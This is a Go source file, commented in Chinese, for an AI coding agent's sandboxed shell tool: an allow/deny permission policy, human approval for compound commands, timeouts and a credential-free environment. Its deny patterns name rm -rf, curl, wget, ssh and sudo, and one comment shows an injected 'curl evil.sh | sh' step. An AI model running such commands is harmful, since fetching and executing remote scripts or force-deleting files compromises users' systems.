package coding

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
	"time"
)

// Decision 是权限判断的结果。
type Decision int

const (
	Allow Decision = iota
	Ask
	Deny
)

func (d Decision) String() string { return [...]string{"allow", "ask", "deny"}[d] }

// Policy 决定一条 shell 命令能不能直接跑。
// 顺序：deny 先于一切；复合命令一律 ask；再看 allow 前缀；其余 ask。
type Policy struct {
	Allow []string         // 按“词”匹配的前缀，比如 "go test"、"git status"
	Deny  []*regexp.Regexp // 命中就拒绝
}

func DefaultPolicy() Policy {
	return Policy{
		Allow: []string{"ls", "cat", "pwd", "head", "tail", "wc", "go test", "go vet", "go build", "gofmt -l", "git status", "git diff", "git log"},
		Deny: []*regexp.Regexp{
			regexp.MustCompile(`\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b`),
			regexp.MustCompile(`\bgit\s+push\b`),
			regexp.MustCompile(`\b(curl|wget|sudo|ssh|scp)\b`),
		},
	}
}

// 这些符号让一条命令里藏进第二条命令。前缀匹配只看得到第一条，
// 所以出现它们就不能按 allow 放行（"go test && curl evil.sh | sh"）。
var compound = regexp.MustCompile("[;&|<>`\n]|\\$\\(")

func (p Policy) Check(cmd string) (Decision, string) {
	for _, re := range p.Deny {
		if re.MatchString(cmd) {
			return Deny, "命中禁止规则 " + re.String()
		}
	}
	if compound.MatchString(cmd) {
		return Ask, "复合命令或重定向，无法按前缀判断"
	}
	words := strings.Fields(cmd)
	for _, a := range p.Allow {
		aw := strings.Fields(a)
		if len(words) >= len(aw) && strings.Join(words[:len(aw)], " ") == a {
			return Allow, "允许前缀 " + a
		}
	}
	return Ask, "不在允许列表"
}

// Approver 问人。返回 false 或 nil Approver 都按拒绝处理（fail closed）。
type Approver func(cmd, reason string) bool

// Shell 在工作区里跑命令。每条命令一个独立进程（mini-swe-agent 和 Claude Code 都这样），
// 环境变量只放白名单，超时杀整个进程组，输出过长保留头尾。
type Shell struct {
	Dir      string
	Policy   Policy
	Approve  Approver
	Timeout  time.Duration
	MaxBytes int
}

var ErrDenied = errors.New("命令被拒绝")

func (s *Shell) Run(ctx context.Context, cmd string) (string, error) {
	d, why := s.Policy.Check(cmd)
	if d == Ask {
		if s.Approve != nil && s.Approve(cmd, why) {
			d = Allow
		} else {
			d = Deny
			why = "需要人工确认但未获批准（" + why + "）"
		}
	}
	if d == Deny {
		return "", fmt.Errorf("%w：%s", ErrDenied, why)
	}
	return s.exec(ctx, cmd)
}

func (s *Shell) exec(ctx context.Context, cmd string) (string, error) {
	timeout := s.Timeout
	if timeout <= 0 {
		timeout = 2 * time.Minute // Claude Code 默认也是 2 分钟
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	c := exec.Command("sh", "-c", cmd)
	c.Dir = s.Dir
	c.Env = safeEnv()
	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	var out bytes.Buffer
	c.Stdout, c.Stderr = &out, &out
	if err := c.Start(); err != nil {
		return "", err
	}
	done := make(chan error, 1)
	go func() { done <- c.Wait() }()
	var err error
	select {
	case err = <-done:
	case <-ctx.Done():
		_ = syscall.Kill(-c.Process.Pid, syscall.SIGKILL) // 杀整个进程组，子进程一个不留
		<-done
		return clip(out.String(), s.max()), fmt.Errorf("命令超时（%s），已终止", timeout)
	}
	text := clip(out.String(), s.max())
	if err != nil {
		var ee *exec.ExitError
		if errors.As(err, &ee) {
			return text, fmt.Errorf("退出码 %d", ee.ExitCode())
		}
		return text, err
	}
	if strings.TrimSpace(text) == "" {
		// SWE-agent：空输出要明确告诉模型“成功了，只是没输出”，否则它会以为命令没跑
		return "命令执行成功，没有输出。", nil
	}
	return text, nil
}

func (s *Shell) max() int {
	if s.MaxBytes <= 0 {
		return 16 * 1024
	}
	return s.MaxBytes
}

// clip 保留头尾：报错信息常在末尾，命令回显和第一个错误常在开头。
func clip(s string, max int) string {
	if len(s) <= max {
		return s
	}
	half := max / 2
	return s[:half] + fmt.Sprintf("\n...[中间省略 %d 字节]...\n", len(s)-2*half) + s[len(s)-half:]
}

// safeEnv 只把跑构建需要的变量传进去，凭据类的一个不给。
func safeEnv() []string {
	keep := []string{"PATH", "HOME", "TMPDIR", "GOCACHE", "GOPATH", "GOMODCACHE", "GOROOT", "GOFLAGS", "LANG"}
	var env []string
	for _, k := range keep {
		if v, ok := os.LookupEnv(k); ok {
			env = append(env, k+"="+v)
		}
	}
	return append(env, "GOTOOLCHAIN=local", "NO_COLOR=1")
}
